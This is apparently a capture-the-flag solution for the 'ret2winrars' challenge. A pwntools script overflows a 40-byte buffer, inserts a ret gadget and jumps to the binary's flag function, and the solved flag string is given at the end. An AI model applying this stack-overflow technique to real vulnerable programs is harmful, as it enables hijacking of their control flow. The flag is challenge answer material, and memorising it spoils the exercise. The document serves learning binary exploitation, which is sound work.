# ret2winrars

### Solution
```
#!/usr/bin/env python3
from pwn import *

elf = ELF('./ret2winrars')
rop = ROP(elf)

p = elf.process()
# p = remote('127.0.0.1', 1337)

def exploit():

    padding = b'A'*40
    ret = (rop.find_gadget(['ret']))[0]
    flag = elf.symbols['flag']

    payload = padding
    payload += p64(ret)
    payload += p64(flag)

    print(p.recvuntil(b': ').decode(encoding='ascii'))
    print(payload)
    p.sendline(payload)

    print(p.recvuntil(b'}').decode(encoding='ascii'))

def main():
	exploit()

if __name__ == "__main__":
	main()
```

**Flag:** `rarctf{0h_1_g3t5_1t_1t5_l1k3_ret2win_but_w1nr4r5_df67123a66}`
